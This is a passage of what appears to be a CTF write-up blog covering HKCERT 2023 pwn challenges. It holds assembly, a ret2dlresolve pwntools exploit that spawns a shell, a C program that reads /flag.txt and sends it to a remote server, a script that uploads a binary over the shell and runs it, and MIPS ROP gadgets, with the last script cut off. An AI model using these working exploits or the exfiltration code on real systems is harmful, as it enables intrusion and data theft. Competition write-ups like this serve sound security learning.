<span style="color:#a6e22e">XOR</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esi</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">POP</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">RET</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">esp</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">12</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>]
<span style="color:#a6e22e">CMP</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">2</span>
<span style="color:#a6e22e">JLE</span> <span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x4</span>
<span style="color:#a6e22e">JMP</span> <span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0xd</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">POP</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">RET</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#ae81ff">0x400600</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#ae81ff">0x400600</span>] 
<span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">1</span>                 
<span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#ae81ff">0x400600</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#ae81ff">0x400600</span>]
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-8</span>], <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">CALL</span> -<span style="color:#ae81ff">0x3b</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edi</span>, <span style="color:#ae81ff">2</span>
<span style="color:#a6e22e">imul</span> <span style="color:#66d9ef">edi</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">ebp-8</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edi</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">edi</span>, <span style="color:#ae81ff">2</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-8</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-12</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">CALL</span> -<span style="color:#ae81ff">0x64</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">ebp-12</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">ebp-8</span>]
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-8</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-12</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">CALL</span> -<span style="color:#ae81ff">0x9e</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">8</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">POP</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">RET</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">104</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">esp</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">0</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x8341013f</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x83391117</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xe35141cf</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xa3899167</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xc3e101df</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x43599137</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x23f1416f</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x63a91187</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x381017f</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x3791157</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x6391410f</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x23c991a7</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x3e1e602a</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xaac6fc18</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x940434cc</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xbcdd4ea9</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xb39e6f8f</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xea8e25ed</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xd2bc703b</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xd339ce89</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0xa23e362a</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x73bba5e8</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x54412994</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x501b6575</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#ae81ff">0x66626a69</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">0</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-104</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">CALL</span> -<span style="color:#ae81ff">0x11e</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">AND</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">255</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edi</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">100</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">ebp-104</span>]
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">XOR</span> [<span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">100</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">XOR</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">XOR</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">XOR</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#ae81ff">0x400600</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#ae81ff">0x400b00</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>,  [<span style="color:#ae81ff">0x400b00</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">CMP</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">100</span>
<span style="color:#a6e22e">MOV</span> [<span style="color:#66d9ef">ebp-104</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#a6e22e">JNZ</span> -<span style="color:#ae81ff">0x61</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">0</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
<span style="color:#a6e22e">ADD</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">104</span>
</code></pre></div><h1 id="pwn">Pwn</h1>
<h2 id="rop-revenge-300-points-13-solves">ROP Revenge (300 points, 13 solves)</h2>
<p>This is a easy pwn that if you know the technique of ret2dlresolve, I exploited and got the shell in a few minutes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">context.binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
rop <span style="color:#f92672">=</span> ROP(context.binary)
dlresolve <span style="color:#f92672">=</span> Ret2dlresolvePayload(elf,symbol<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;system&#34;</span>,args<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;/bin/sh&#34;</span>])

rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop <span style="color:#f92672">=</span> rop.chain()

payload <span style="color:#f92672">=</span> flat({<span style="color:#ae81ff">120</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x000000000040101a</span>,<span style="color:#ae81ff">128</span><span style="color:#f92672">:</span>raw_rop,<span style="color:#ae81ff">256</span><span style="color:#f92672">:</span>dlresolve.payload})
io.sendline(payload)
sleep(<span style="color:#ae81ff">0.2</span>)
io.sendline(dlresolve.payload)
</code></pre></div><p>However, it closed stdin and stderr which we are not allowed to get the output from the shell.</p>
<p>To address the issue, I used the solution from my created challenge <code>Disconnect</code> in Bauhiniactf2023.
<a href="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/#disconnect-500-points--1-solve">https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/#disconnect-500-points--1-solve</a></p>
<p>Which is upload a binary that would send the flag content to my remote server.</p>
<h3 id="solvec">solve.c</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;liburing.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YOUR PUBLIC IP&#34;</span>; <span style="color:#75715e">//change this
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">58888</span>; <span style="color:#75715e">//change this
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc , <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
{
    <span style="color:#66d9ef">struct</span> io_uring ring;
    <span style="color:#66d9ef">struct</span> io_uring_sqe <span style="color:#f92672">*</span>sqe;
    <span style="color:#66d9ef">struct</span> io_uring_cqe <span style="color:#f92672">*</span>cqe;
    <span style="color:#66d9ef">char</span> message[<span style="color:#ae81ff">0x100</span>];
    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">0x100</span>];

    memset(message, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>);
    memset(flag, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>);

    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/flag.txt&#34;</span>, <span style="color:#ae81ff">0</span>);                      

    read(fd , flag, <span style="color:#ae81ff">0x100</span>);
    write(<span style="color:#ae81ff">1</span>, flag, <span style="color:#ae81ff">0x100</span>);

    io_uring_queue_init(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>ring, <span style="color:#ae81ff">0</span>);
    sqe <span style="color:#f92672">=</span> io_uring_get_sqe(<span style="color:#f92672">&amp;</span>ring);
    
    sqe<span style="color:#f92672">-&gt;</span>opcode <span style="color:#f92672">=</span> IORING_OP_SOCKET;
    sqe<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> AF_INET;
    sqe<span style="color:#f92672">-&gt;</span>off <span style="color:#f92672">=</span> SOCK_STREAM;
    sqe<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;			
    sqe<span style="color:#f92672">-&gt;</span>rw_flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    io_uring_submit(<span style="color:#f92672">&amp;</span>ring);
    io_uring_wait_cqe(<span style="color:#f92672">&amp;</span>ring, <span style="color:#f92672">&amp;</span>cqe);

    <span style="color:#66d9ef">int</span> sockfd <span style="color:#f92672">=</span> cqe<span style="color:#f92672">-&gt;</span>res;

    strcat(message, <span style="color:#e6db74">&#34;GET /&#34;</span>);
    strcat(message, flag);
    strcat(message, <span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
    strcat(message, <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);

    <span style="color:#75715e">// socket connection
</span><span style="color:#75715e"></span>
    <span style="color:#66d9ef">struct</span> sockaddr_in info;
    bzero(<span style="color:#f92672">&amp;</span>info,<span style="color:#66d9ef">sizeof</span>(info));
    info.sin_family <span style="color:#f92672">=</span> PF_INET;

    <span style="color:#75715e">// ip &amp; port
</span><span style="color:#75715e"></span>    info.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(ip);
    info.sin_port <span style="color:#f92672">=</span> htons(port);

    <span style="color:#66d9ef">int</span> err <span style="color:#f92672">=</span> connect(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info));
    send(sockfd, message, <span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">0</span>);

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h3 id="exploit-script">Exploit script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
<span style="color:#f92672">import</span> gzip
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
rop <span style="color:#f92672">=</span> ROP(context<span style="color:#f92672">.</span>binary)
dlresolve <span style="color:#f92672">=</span> Ret2dlresolvePayload(elf,symbol<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;system&#34;</span>,args<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;/bin/sh&#34;</span>])

rop<span style="color:#f92672">.</span>gets(dlresolve<span style="color:#f92672">.</span>data_addr)
rop<span style="color:#f92672">.</span>ret2dlresolve(dlresolve)
raw_rop <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>chain()
<span style="color:#75715e">#io = remote(&#34;127.0.0.1&#34;, 1337)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chal.hkcert23.pwnable.hk&#34;</span>, <span style="color:#ae81ff">28352</span>)
payload <span style="color:#f92672">=</span> flat({<span style="color:#ae81ff">120</span>: <span style="color:#ae81ff">0x000000000040101a</span>,<span style="color:#ae81ff">128</span>:raw_rop,<span style="color:#ae81ff">256</span>:dlresolve<span style="color:#f92672">.</span>payload})
io<span style="color:#f92672">.</span>sendline(payload)
sleep(<span style="color:#ae81ff">0.2</span>)
io<span style="color:#f92672">.</span>sendline(dlresolve<span style="color:#f92672">.</span>payload)
print(<span style="color:#e6db74">&#34;sent&#34;</span>)

size <span style="color:#f92672">=</span> <span style="color:#ae81ff">512</span> <span style="color:#75715e"># size per upload</span>

io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;cd /tmp&#39;</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;rm b64exp.gz&#39;</span>)
info(<span style="color:#e6db74">&#34;Uploading...&#34;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), size):
    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Uploading... </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> / </span><span style="color:#e6db74">{</span>len(payload)<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
    <span style="color:#75715e">#sleep(0.1)</span>
    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;echo &#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; &gt;&gt; b64exp.gz&#39;</span><span style="color:#f92672">.</span>format(payload[i:i<span style="color:#f92672">+</span>size]))

io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;base64 -d b64exp.gz &gt; exp.gz&#39;</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;gzip -d exp.gz&#39;</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;chmod +x /tmp/exp&#39;</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/tmp/exp&#39;</span>)

</code></pre></div><h2 id="mips-rop-300-points-14-solves">mips rop (300 points, 14 solves)</h2>
<p>This provided program is a mips arch binary without any protection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Canary                        : <span style="color:#960050;background-color:#1e0010">✓</span> (value: <span style="color:#ae81ff">0xd7bcd900</span>)
NX                            : <span style="color:#960050;background-color:#1e0010">✘</span> 
PIE                           : <span style="color:#960050;background-color:#1e0010">✘</span> 
Fortify                       : <span style="color:#960050;background-color:#1e0010">✘</span> 
RelRO                         : Partial
</code></pre></div><p>We can use <code>qemu-mips-static -g 1234 ./rop</code> to run the binary and open a port for debugging and use <code>gdb-multiarch ./rop</code> with commands <code>set architecture mips</code> and <code>target remote 127.0.0.1:1234</code> to attach the binary with gdb.</p>
<p>The challenging part is finding the correct gadget and jump to the stack location that we placed the shellcode.</p>
<p>We have used four gadgets in total.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">set_sp2s7_jmp_s1  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x041F0A4</span>
<span style="color:#75715e"># .text:0041F0A4                 addiu   $s7, $sp, 0x20+var_8</span>
<span style="color:#75715e"># .text:0041F0A8                 li      $s5, strtoul</span>
<span style="color:#75715e"># .text:0041F0AC                 move    $s0, $v0</span>
<span style="color:#75715e"># .text:0041F0B0                 move    $t9, $s1</span>
<span style="color:#75715e"># .text:0041F0B4                 jalr    $t9</span>

set_ra_s1_s2_s0_jmp_ra <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0400C14</span>
<span style="color:#75715e"># .text:00400C14                 lw      $ra, 0xB8+var_sC($sp)</span>
<span style="color:#75715e"># .text:00400C18                 lw      $s2, 0xB8+var_s8($sp)</span>
<span style="color:#75715e"># .text:00400C1C                 lw      $s1, 0xB8+var_s4($sp)</span>
<span style="color:#75715e"># .text:00400C20                 lw      $s0, 0xB8+var_s0($sp)</span>
<span style="color:#75715e"># .text:00400C24                 jr      $ra</span>

set_sp2a1_jmp_s2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00440784</span>
<span style="color:#75715e"># .text:00440784                 addiu   $a1, $sp, 0x6C+var_38</span>
<span style="color:#75715e"># .text:00440788                 sw      $zero, 0x6C+var_5C($sp)</span>
<span style="color:#75715e"># .text:0044078C                 move    $t9, $s2</span>
<span style="color:#75715e"># .text:00440790                 jalr    $t9</span>

mov_s1_a1_jmp_s0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x044E20C</span>
<span style="color:#75715e"># .text:0044E20C                 move    $s1, $a1</span>
<span style="color:#75715e"># .text:0044E210                 addiu   $s5, $v0, 1</span>
<span style="color:#75715e"># .text:0044E214                 move    $t9, $s0</span>
<span style="color:#75715e"># .text:0044E218                 jalr    $t9 ; strlen</span>
</code></pre></div><h3 id="exploit-script-1">Exploit Script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chal.hkcert23.pwnable.hk&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28151</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mips&#39;</span> <span style="color:#75715e"># i386/amd64</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;big&#34;</span>

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#75715e"># libc = ELF(&#39;&#39;)</span>
<span style="color:#66d9ef">else</span>:
    p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;qemu-mips-static&#39;</span>, <span style="color:#e6db74">&#39;-g&#39;</span>, <span style="color:#e6db74">&#39;1234&#39;</span>,<span style="color:#e6db74">&#39;./rop&#39;</span>])
    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)

<span style="color:#75715e">#--- helper functions</span>
s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)    
sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
